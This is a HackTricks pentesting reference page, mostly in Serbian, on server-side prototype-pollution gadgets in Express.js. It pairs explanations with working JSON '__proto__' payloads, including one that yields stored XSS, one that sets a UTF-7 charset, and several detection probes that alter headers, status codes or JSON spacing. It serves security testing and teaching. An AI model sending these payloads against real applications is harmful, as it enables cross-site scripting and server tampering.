# Express Prototype Pollution Gadgets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Serve XSS responses

**Za više detalja** [**pogledajte originalno istraživanje**](https://portswigger.net/research/server-side-prototype-pollution)

### Promenite JSON content-type u HTML

U Express aplikaciji koja koristi **JSON content type response** i reflektuje JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
U ovim slučajevima XSS obično nije moguć sa JSON tipom sadržaja. Međutim, sa zagađenjem prototipa možemo **zbuniti Express da vrati HTML odgovor.** Ova ranjivost se oslanja na aplikaciju koja koristi **`res.send(obj)`** i koristi parser tela sa tipom sadržaja application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
By **polluting** **`body`** and **`_body`** properties, it's possible to cause **Express to serve up the HTML content type** and reflect the `_body` property, resulting in stored XSS.

### Render UTF7

Moguće je naterati express da **prikazuje UTF-7 sadržaj sa**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Tehnike bezbednog skeniranja

### JSON razmaci

Sledeći PP će dodati dodatni razmak unutar JSON atributa koji neće pokvariti funkcionalnost:
```json
{"__proto__":{"json spaces": " "}}
```
Tada će reflektovani JSON izgledati ovako:
```json
{"foo":  "bar"} -- Note the extra space
```
### Izloženi Headeri

Sledeći PP gadget će naterati server da vrati HTTP header: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Zahteva se da **CORS modul bude instaliran**

### **OPTIONS Metoda**

Sa sledećim payload-om, moguće je **sakriti metodu iz OPTIONS odgovora**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

Moguće je promeniti **vratni status kod** koristeći sledeći PP payload:
```json
{"__proto__":{"status":510}}
```
### Greška

Kada dodelite prototipu primitivnu vrednost kao što je string, to proizvodi **operaciju bez efekta jer prototip mora biti objekat**. Ako pokušate da dodelite objekat prototipa samom `Object.prototype`, to će **izazvati izuzetak**. Možemo koristiti ova dva ponašanja da **otkrijemo da li je zagađenje prototipa bilo uspešno**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflected Value

Kada aplikacija uključuje objekat u svoj odgovor, kreiranje atributa sa **neobičnim imenom pored `__proto__`** može biti korisno. Konkretno, ako **samo neobični atribut bude vraćen** u odgovoru, to može ukazivati na ranjivost aplikacije:
```json
{"unusualName":"value","__proto__":"test"}
```
Pored toga, u scenarijima gde se koristi biblioteka kao što je Lodash, postavljanje svojstva kako putem zagađenja prototipa (PP) tako i direktno unutar objekta nudi još jedan dijagnostički pristup. Ako je takvo svojstvo izostavljeno iz odgovora, to sugeriše da Lodash proverava postojanje svojstva u ciljanom objektu pre nego što ga spoji:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Razno

### Dozvoli tačke

Postoji opcija u Express-u koja vam omogućava da **kreirate objekte iz parametara upita**.\
Definitivno je možete koristiti u **lancu** grešaka za iskorišćavanje **ranjivosti zagađenja prototipa**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` kreira objekat u Node.**

## Reference

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
